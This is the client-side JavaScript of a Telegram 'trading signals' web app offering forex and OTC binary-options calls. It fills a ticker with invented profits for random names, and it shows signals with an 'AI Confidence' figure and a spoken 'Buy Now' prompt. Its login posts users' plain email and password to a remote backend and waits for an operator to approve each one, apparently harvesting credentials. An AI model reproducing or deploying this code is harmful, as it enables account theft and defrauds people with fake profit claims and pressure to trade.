// ⚠️ ENTER YOUR RENDER URL
const RENDER_BACKEND_URL = "https://aliza-trading-final-codes.onrender.com";

// Wait for the DOM to fully load before running ANY logic (Fixes the Dropdown/Tab Issue)
document.addEventListener("DOMContentLoaded", () => {
    
    // --- TELEGRAM INIT ---
    let tg;
    try {
        tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();
    } catch(e) { console.log("Running in standard browser."); }
    
    const USER_ID = tg?.initDataUnsafe?.user?.id || Math.floor(Math.random() * 100000);

    // --- SEAMLESS TICKER LOGIC ---
    const names = ["Rahul", "Priya", "Amit", "Sara", "Ali", "Neha", "Usman", "Ravi", "Ayesha", "John"];
    const tickerContainer = document.getElementById('tickerItems');
    if (tickerContainer) {
        let baseHTML = "";
        for(let i=0; i<10; i++) {
            const name = names[Math.floor(Math.random() * names.length)];
            const profit = Math.floor(Math.random() * (200 - 50 + 1)) + 50;
            baseHTML += `<div class="ticker-item">🏆 ${name} Profit: <span>+$${profit}</span></div>`;
        }
        tickerContainer.innerHTML = baseHTML + baseHTML; 
    }

    // --- DROPDOWN POPULATION LOGIC (FIXED) ---
    const marketSelect = document.getElementById('marketType');
    const assetSelect = document.getElementById('assetPair');
    const assetsData = { 
        live: ["EUR/USD", "GBP/USD", "USD/JPY", "AUD/USD", "USD/CHF"], 
        otc: ["EUR/USD (OTC)", "GBP/USD (OTC)", "USD/JPY (OTC)", "AUD/CAD (OTC)"] 
    };

    if (marketSelect && assetSelect) {
        marketSelect.addEventListener('change', () => {
            assetSelect.innerHTML = '<option value="" disabled selected>-- Select Asset Pair --</option>';
            const selectedMarket = marketSelect.value;
            
            if (assetsData[selectedMarket]) {
                assetsData[selectedMarket].forEach(pair => {
                    let opt = document.createElement('option');
                    opt.value = pair; 
                    opt.innerHTML = pair;
                    assetSelect.appendChild(opt);
                });
            }
        });
    }

    // --- TABS SWITCHING LOGIC (FIXED) ---
    const navItems = document.querySelectorAll('.nav-item');
    const tabContents = document.querySelectorAll('.tab-content');

    navItems.forEach(item => {
        item.addEventListener('click', function() {
            // Remove active classes
            navItems.forEach(nav => nav.classList.remove('active-nav'));
            tabContents.forEach(tab => tab.classList.remove('active-tab'));

            // Add active class to clicked nav and target tab
            this.classList.add('active-nav');
            const targetId = this.getAttribute('data-target');
            document.getElementById(targetId).classList.add('active-tab');

            if(tg?.HapticFeedback) tg.HapticFeedback.selectionChanged();
        });
    });

    // --- LOGIN LOGIC ---
    let pollInterval;
    const btnLogin = document.getElementById('btnLogin');
    
    if (btnLogin) {
        btnLogin.addEventListener('click', async () => {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            if(!email || !password) return alert("Credentials required.");
            
            document.getElementById('login-form').style.display = 'none';
            document.getElementById('waiting-msg').style.display = 'block';

            try {
                await fetch(`${RENDER_BACKEND_URL}/api/login`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ user_id: USER_ID, email, password })
                });
                pollInterval = setInterval(checkApproval, 3000);
            } catch (e) {
                alert("Server Connection Failed.");
                document.getElementById('waiting-msg').style.display = 'none';
                document.getElementById('login-form').style.display = 'block';
            }
        });
    }

    async function checkApproval() {
        try {
            const res = await fetch(`${RENDER_BACKEND_URL}/api/check_status/${USER_ID}`);
            const data = await res.json();
            
            if (data.status === 'approved') {
                clearInterval(pollInterval);
                document.getElementById('login-screen').style.display = 'none';
                
                const splash = document.getElementById('splash-screen');
                splash.style.display = 'flex';
                
                setTimeout(() => {
                    splash.style.opacity = '0';
                    setTimeout(() => {
                        splash.style.display = 'none';
                        document.getElementById('main-app').style.display = 'block';
                    }, 500);
                }, 2000);
                
            } else if (data.status === 'declined') {
                clearInterval(pollInterval);
                alert("❌ Access Denied.");
                document.getElementById('waiting-msg').style.display = 'none';
                document.getElementById('login-form').style.display = 'block';
            }
        } catch (e) {}
    }

    // --- VOICE LOGIC ---
    function speakSignal(direction) {
        if ('speechSynthesis' in window) {
            window.speechSynthesis.cancel();
            const utterance = new SpeechSynthesisUtterance(direction === 'UP' ? 'Buy Now. Go Up' : 'Sell Now. Go Down');
            utterance.pitch = 1.1;
            const voices = window.speechSynthesis.getVoices();
            const femaleVoice = voices.find(v => v.name.includes('Female') || v.name.includes('Zira'));
            if (femaleVoice) utterance.voice = femaleVoice;
            window.speechSynthesis.speak(utterance);
        }
    }
    window.speechSynthesis.onvoiceschanged = () => window.speechSynthesis.getVoices();

    // --- SIGNAL GENERATION LOGIC (WITH VALIDATION) ---
    const btnGen = document.getElementById('btnGen');
    if (btnGen) {
        btnGen.addEventListener('click', async () => {
            
            // 🚨 STRICT VALIDATION: Check if Market and Asset are selected
            if (!marketSelect.value || marketSelect.value === "") {
                if(tg?.showAlert) tg.showAlert("⚠️ Please select a Market Type first.");
                else alert("⚠️ Please select a Market Type first.");
                return;
            }
            if (!assetSelect.value || assetSelect.value === "") {
                if(tg?.showAlert) tg.showAlert("⚠️ Please select an Asset Pair first.");
                else alert("⚠️ Please select an Asset Pair first.");
                return;
            }

            const scanner = document.getElementById('scanner');
            const resultBox = document.getElementById('resultBox');
            
            btnGen.style.display = 'none';
            resultBox.style.display = 'none';
            scanner.style.display = 'block';
            
            if(tg?.HapticFeedback) tg.HapticFeedback.impactOccurred('medium');

            try {
                const response = await fetch(`${RENDER_BACKEND_URL}/api/get_signal/${USER_ID}`);
                
                if(response.status === 403) {
                    const errorData = await response.json();
                    scanner.style.display = 'none';
                    btnGen.style.display = 'block';
                    if(tg?.showAlert) tg.showAlert(errorData.message || "Limit Reached!");
                    return;
                }

                const data = await response.json();
                scanner.style.display = 'none';
                resultBox.style.display = 'block';
                btnGen.style.display = 'block';
                btnGen.innerText = "Fetch Next Signal 🔄";
                
                const isUp = data.direction === 'UP';
                document.getElementById('signalOutput').className = 'signal-text ' + (isUp ? 'signal-UP' : 'signal-DOWN');
                document.getElementById('signalOutput').innerHTML = isUp ? 'CALL (UP) ⬆️' : 'PUT (DOWN) ⬇️';
                
                // Animate Accuracy Bar
                document.getElementById('accuracyText').innerHTML = `AI Confidence: ${data.accuracy}%`;
                setTimeout(() => {
                    document.getElementById('accBar').style.width = `${data.accuracy}%`;
                }, 100);
                
                if(tg?.HapticFeedback) tg.HapticFeedback.notificationOccurred(isUp ? 'success' : 'warning');
                speakSignal(data.direction);

            } catch (error) {
                scanner.style.display = 'none';
                btnGen.style.display = 'block';
                if(tg?.showAlert) tg.showAlert("Server Offline! Tell Admin to start the server.");
            }
        });
    }
}); // End DOMContentLoaded
